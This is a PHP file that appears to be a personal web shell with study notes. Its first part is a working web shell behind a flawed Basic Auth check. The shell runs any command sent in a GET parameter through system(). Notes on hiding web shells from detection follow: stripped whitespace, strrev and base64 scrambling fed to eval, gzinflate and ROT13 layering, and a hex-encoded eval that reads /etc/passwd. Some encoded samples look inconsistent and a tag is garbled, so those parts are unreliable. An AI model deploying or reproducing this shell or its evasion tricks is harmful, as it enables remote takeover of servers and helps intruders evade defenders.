<?php
// This series has lots of great info:
// https://www.acunetix.com/blog/articles/keeping-web-shells-undercover-an-introduction-to-web-shells-part-3/



// HTTP Basic Auth
if (!isset($_SERVER['PHP_AUTH_USER']) || ($_SERVER['PHP_AUTH_USER'] != 'secret' && $_SERVER['PHP_AUTH_PW'] != 'secret')) {
    header('WWW-Authenticate: Basic realm="This is private"');
    header('HTTP/1.0 401 Unauthorized');
    echo '<html><body>Access denied.</body></html>';
    exit;
}

// `exec()` - Execute an external program
// `shell_exec()` - Execute command via shell and return the complete output as a string
// `passthru()` - Execute an external program and display raw output
// `system()` - Execute an external program and display the output - returns last line of command, and can provide exit code
// Also can use: `escapeshellarg()`, `escapeshellcmd()`
?>
<html>
<head>

</head>
<body>
<form method="GET"><input type="text" name="command"/>
    <button type="submit" name="submit">Run</button>
</form>
<div>
    <pre>
<?php
if (isset($_GET['command'])) {
    // Use @system() to surpress error messages from being written to logs
    system($_GET['command'] . ' 2>&1'); // Pipe stderr to stdout
}
?>

    </pre>
</div>
</body>
</html>





<?php exit; ?>

// To make it stealthier, could use a header like $_SERVER['HTTP_ACCEPT_LANGUAGE']
// instead of a GET query which would be more obvious in the log entries


Whitespace
By removing the whitespace from a block of code, it looks like a big string, which makes it less readable and harder to identify what the script does.

<?php
// Whitespace makes things easy to read
function myshellexec($cmd){
    global $disablefunc; $result = "";
    if (!empty($cmd)){
        if (is_callable("exec") && !in_array("exec",$disablefunc)) {
            exec($cmd,$result); $result = join("",$result);
        }
    }
}
// Whitespace removed makes things harder to read
function myshellexec($cmd) {global $disablefunc;$result = "";
    if(!empty($cmd)) { if (is_callable("exec") and
        !in_array("exec",$disablefunc)){exec($cmd,$result); $result=join(" ",$result);}}}
?>











    Scrambling
    Scrambling is a technique that can be used effectively in combination with others to help a web shell go undetected. It scrambles the code making it unreadable and makes use of various functions that will reconstruct the code when run.

<?php
// Scrambled
$k='c3lzdGVtKCdscyAtbGEnKTs=';$c=strrev('(edoced_46esab.""nruter')."'".$k."');";$f=eval($c);eval($f);

// Unscrambled
// base_64 encoded string -> system('ls -la');
$k='c3lzdGVtKCdscyAtbGEnKTs=';
// strrev() reverses a given string:   strrev('(edoced_46esab.""nruter')."'".$k."')
$c= eval("return base64_decode('c3lzdGVtKCdscyAtbGEnKTs=');");
// $c = system('ls -la');
$f=eval($c);
eval($f);
?>




Encoding, Compression, and Replacement Techniques
Web shells typically make use of additional techniques to hide what they are doing. Below are some common functions that PHP-based web shells leverage to go undetected.

eval(): A function that evaluates a given string as PHP code
assert(): A function that evaluates a given string as PHP code
base64(): Encodes data with MIME base64 encoding
gzdeflate(): Compresses a string using DEFLATE data format; gzinflate() decompresses it
str_rot13(): Shifts every letter of a given string 13 places in the alphabet
The following examples all produce the same result, however, an attacker might choose to use more obfuscation techniques in order for the web shell to keep a low profile.

<?php
// Evaluates the string "system('ls -la');" as PHP code
eval("system('ls -la');");

// Decodes the Base64 encoded string and evaluates the decoded string "system('ls -la');" as PHP code
eval(base64_decode("c3lzdGVtKCdscyAtbGEnKTsNCg=="));

// Decodes the compressed, Base64 encoded string and evaluates the decoded string "system('ls -la');" as PHP code
eval(gzinflate(base64_decode('K64sLknN1VDKKVbQzUlU0rQGAA==')));

// Decodes the compressed, ROT13 encoded, Base64 encoded string and evaluates the decoded string "system('ls -la');" as PHP code
eval(gzinflate(str_rot13(base64_decode('K64sLlbN1UPKKUnQzVZH0rQGAA=='))));

// Decodes the compressed, Base64 encoded string and evaluates the decoded string "system('ls -la');" as PHP code
assert(gzinflate(base64_decode('K64sLknN1VDKKVbQzUlU0rQGAA==')));
?>









Using Hex as an Obfuscation Technique
Hexadecimal values of ASCII characters can also be used to further obfuscate web shell commands. Let’s take the following string as an example.

system('cat /etc/passwd');
The following is the value of the above string in hexadecimal.

73797374656d2827636174202f6574632f70617373776427293b
Therefore, the following code can be used to accept a hexadecimal-encoded string and evaluate it as PHP code.

<?php <br ?--> // function that accepts a hex encoded data
function dcd($hex){
// split $hex
for ($i=0; $i < strlen($hex)-1; $i+=2){
//run hexdec on every two characters to get their decimal representation which will be then used by char() to find the corresponding ASCII character
$string .= chr(hexdec($hex[$i].$hex[$i+1]));
}
// evaluate/execute the command
eval($string);
}
dcd('73797374656d2827636174202f6574632f70617373776427293b');
?>






























